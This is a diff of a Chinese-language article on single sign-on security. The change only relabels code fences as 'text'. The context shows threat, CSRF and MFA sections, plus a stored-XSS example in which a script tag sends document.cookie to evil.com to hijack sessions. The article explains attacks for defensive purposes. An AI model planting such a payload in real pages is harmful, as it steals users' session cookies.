@@ -5,7 +5,7 @@ SSO 集中了所有系统的认证入口，一旦被攻破，影响范围极广�
 
 # 2. 威胁全景
 
-```
+```text
 ┌──────────────────────────────────────────────────────────────────┐
 │                    SSO 安全威胁全景                               │
 │                                                                   │
@@ -47,7 +47,7 @@ SSO 集中了所有系统的认证入口，一旦被攻破，影响范围极广�
 
 ## 3.1 攻击场景
 
-```
+```text
 场景 1：存储型 XSS
 用户在备注中输入 <script>fetch('https://evil.com?cookie='+document.cookie)</script>
 → 页面渲染时执行脚本 → Cookie 泄露 → 攻击者劫持会话
@@ -95,7 +95,7 @@ response.setHeader("X-XSS-Protection", "1; mode=block");
 
 ## 4.1 SSO 场景的 CSRF 攻击
 
-```
+```text
 攻击场景（OAuth2 登录 CSRF）：
 1. 攻击者用自己的账号完成认证，获得 code=attacker_code
 2. 攻击者诱导受害者访问：
@@ -349,7 +349,7 @@ public class JtiReplayProtection {
 
 ## 7.1 MFA 在 SSO 中的位置
 
-```
+```text
 SSO 认证中心是 MFA 的最佳实施点：
 - 一次部署，所有系统受益
 - 支持 TOTP（Google Authenticator）、SMS、硬件 Key（WebAuthn/FIDO2）
